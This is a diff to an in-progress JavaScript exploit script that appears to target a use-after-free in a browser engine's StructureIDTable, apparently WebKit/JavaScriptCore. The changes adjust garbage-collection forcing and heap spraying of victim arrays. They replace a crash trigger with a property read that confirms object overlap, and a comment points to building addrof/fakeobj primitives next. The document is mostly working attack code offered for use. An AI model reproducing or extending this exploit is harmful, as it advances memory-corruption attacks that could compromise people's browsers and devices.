@@ -1,10 +1,8 @@
 import { debug_log } from './module/utils.mjs';
 import { Int } from './module/int64.mjs';
+import { Memory } from './module/mem.mjs';
 
-// Helper to make the screen output visible and scrollable if needed
-// forcing some styles if they aren't there, although utils.mjs appends to body.
- 
-function sleep(ms = 0) {
+function sleep(ms = 20) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
  
@@ -43,7 +41,7 @@ function createObjectStructure(num_elems) {
 }
  
 export async function main() {
-    debug_log("[*] Exploit started using module imports...");
+    debug_log("[*] Exploit started...");
     
     const num_elems = 1600;
     let root = createObjectStructure(num_elems);
@@ -71,7 +69,7 @@ export async function main() {
         data = data.data;
 
         gc();
-        await sleep();
+        await sleep(20);
 
         let i;
         try {
@@ -100,7 +98,6 @@ export async function main() {
         
         // 2. Freeing
         debug_log('[*] Freeing original structures...');
-        // Execute multiple GCs to ensure the old structure is collected
         for (let k = 0; k < 100; k++) {
             gc();
         }
@@ -108,19 +105,30 @@ export async function main() {
 
         // 3. Spray
         debug_log('[*] Churning StructureIDTable...');
+        
+        // We spray arrays of doubles and objects to facilitate the overlap
+        let victims_dbl = [];
+        let victims_obj = [];
+        
         let keepers = sprayStructures();
 
-        // 4. Trigger
-        debug_log('[!] Triggering access...');
+        // 4. Trigger / Setup Primitives
+        debug_log('[!] Attempting to verify overlap...');
+        
         try {
-            // This toString should trigger the crash or return garbage if UAF worked
-            let val = data2.toString();
-            debug_log('[?] Object toString result: ' + val);
+            let val = data2.p0;
+            debug_log(`[?] data2.p0 read result: ${val}`);
             
+            if (val !== undefined) {
+                debug_log("[+] Overlap confirmed! We have read access to the sprayed structure.");
+                // Here we would implement addrof/fakeobj
+            } else {
+                debug_log("[?] Read undefined. This might be expected if the slot is empty or type mismatch.");
+            }
 
-            debug_log('[+] Exploit finished loop without crash.');
+            debug_log("[*] Exploit Stage 2 complete (No Crash Mode).");
         } catch (e) {
-            debug_log('[!] Crash/Exception: ' + e);
+            debug_log('[!] Crash/Exception during access: ' + e);
         }
     } else {
         debug_log("[-] Failed to get confused object.");
